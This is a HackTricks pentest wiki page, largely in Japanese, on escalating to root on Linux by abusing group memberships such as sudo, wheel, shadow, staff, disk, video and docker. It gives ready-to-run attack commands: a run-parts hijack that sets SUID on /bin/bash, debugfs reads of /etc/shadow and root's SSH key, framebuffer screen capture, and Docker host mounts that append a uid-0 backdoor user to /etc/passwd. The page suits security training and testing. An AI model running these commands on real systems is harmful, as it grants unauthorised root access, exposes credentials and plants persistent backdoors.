# Interesting Groups - Linux Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Sudo/Admin Groups

### **PE - Method 1**

**時々、** **デフォルトで（またはいくつかのソフトウェアが必要とするために）** **/etc/sudoers** **ファイル内にこれらの行のいくつかを見つけることができます：**
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
これは、**sudoまたはadminグループに属する任意のユーザーがsudoとして何でも実行できる**ことを意味します。

この場合、**rootになるには次のコマンドを実行するだけです**:
```
sudo su
```
### PE - Method 2

すべてのsuidバイナリを見つけ、バイナリ**Pkexec**があるか確認します:
```bash
find / -perm -4000 2>/dev/null
```
もしバイナリ **pkexec が SUID バイナリ** であり、あなたが **sudo** または **admin** に属している場合、`pkexec` を使用して sudo としてバイナリを実行できる可能性があります。\
これは通常、これらが **polkit ポリシー** 内のグループだからです。このポリシーは基本的にどのグループが `pkexec` を使用できるかを特定します。次のコマンドで確認してください:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
そこでは、どのグループが**pkexec**を実行することを許可されているか、そして**デフォルトで**いくつかのLinuxディストロでは**sudo**および**admin**グループが表示されるかを見つけることができます。

**rootになるには、次のコマンドを実行できます**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
もし**pkexec**を実行し、次の**エラー**が表示された場合：
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**GUIがないために接続されていないのではなく、権限がないからではありません**。この問題の回避策はここにあります: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。**2つの異なるsshセッション**が必要です：

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Wheel Group

**時々**、**デフォルトで** **/etc/sudoers** ファイル内にこの行を見つけることができます:
```
%wheel	ALL=(ALL:ALL) ALL
```
これは、**wheelグループに属する任意のユーザーがsudoとして何でも実行できる**ことを意味します。

この場合、**rootになるには次のように実行するだけです**:
```
sudo su
```
## Shadow Group

**shadow** グループのユーザーは **/etc/shadow** ファイルを **読む** ことができます:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, read the file and try to **crack some hashes**.

## スタッフグループ

**staff**: ユーザーがルート権限を必要とせずにシステムにローカル変更を加えることを許可します（`/usr/local`）。`/usr/local/bin`内の実行可能ファイルは、任意のユーザーのPATH変数に含まれており、同じ名前の`/bin`および`/usr/bin`内の実行可能ファイルを「上書き」する可能性があります。監視/セキュリティに関連する「adm」グループと比較してください。 [\[source\]](https://wiki.debian.org/SystemGroups)

debianディストリビューションでは、`$PATH`変数は、特権ユーザーであろうとなかろうと、`/usr/local/`が最優先で実行されることを示しています。
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
もし `/usr/local` のいくつかのプログラムをハイジャックできれば、簡単にルート権限を取得できます。

`run-parts` プログラムをハイジャックすることは、ルート権限を取得する簡単な方法です。なぜなら、ほとんどのプログラムは (crontab、sshログイン時など) `run-parts` を実行するからです。
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
または新しいsshセッションにログインしたとき。
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**エクスプロイト**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

この特権はほぼ**rootアクセスと同等**であり、マシン内のすべてのデータにアクセスできます。

Files:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
注意: debugfsを使用すると、**ファイルを書き込む**こともできます。例えば、`/tmp/asd1.txt`を`/tmp/asd2.txt`にコピーするには、次のようにします:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
しかし、**rootが所有するファイル**（例えば`/etc/shadow`や`/etc/passwd`）に書き込もうとすると、 "**Permission denied**" エラーが発生します。

## Video Group

コマンド `w` を使用すると、**システムにログインしているユーザー**を見つけることができ、次のような出力が表示されます：
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1**は、ユーザー**yossiが物理的に**マシンのターミナルにログインしていることを意味します。

**videoグループ**は、画面出力を表示するアクセス権を持っています。基本的に、画面を観察することができます。そのためには、**画面上の現在の画像を**生データで取得し、画面が使用している解像度を取得する必要があります。画面データは`/dev/fb0`に保存でき、この画面の解像度は`/sys/class/graphics/fb0/virtual_size`で見つけることができます。
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**生の画像**を**開く**には、**GIMP**を使用し、**`screen.raw`**ファイルを選択し、ファイルタイプとして**Raw image data**を選択します：

![](<../../../.gitbook/assets/image (463).png>)

次に、幅と高さを画面で使用されているものに変更し、異なる画像タイプを確認して（画面をより良く表示するものを選択します）：

![](<../../../.gitbook/assets/image (317).png>)

## ルートグループ

デフォルトでは、**ルートグループのメンバー**は、**サービス**の設定ファイルや**ライブラリ**ファイル、または特権昇格に使用できる**その他の興味深いもの**を**変更**するアクセス権を持っているようです...

**ルートメンバーが変更できるファイルを確認する**：
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Dockerグループ

ホストマシンの**ルートファイルシステムをインスタンスのボリュームにマウント**できます。これにより、インスタンスが起動するとすぐにそのボリュームに`chroot`がロードされます。これにより、実質的にマシン上でroot権限を得ることができます。
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
最後に、以前の提案が気に入らない場合や、何らかの理由で機能していない場合（docker api firewall？）、ここで説明されているように、**特権コンテナを実行してそこから脱出する**ことを試みることができます：

{% content-ref url="../docker-security/" %}
[docker-security](../docker-security/)
{% endcontent-ref %}

dockerソケットに書き込み権限がある場合は、[**dockerソケットを悪用して特権を昇格させる方法に関するこの投稿を読む**](../#writable-docker-socket)**。**

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

## lxc/lxd グループ

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Adm グループ

通常、**`adm`** グループの**メンバー**は、_ /var/log/_ 内にある**ログ**ファイルを**読む**権限を持っています。\
したがって、このグループ内のユーザーを侵害した場合は、**ログを確認する**べきです。

## Auth グループ

OpenBSD内では、**auth** グループは通常、_**/etc/skey**_ および _**/var/db/yubikey**_ フォルダーに書き込むことができます。\
これらの権限は、以下のエクスプロイトを使用して**特権を昇格させる**ために悪用される可能性があります：[https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}
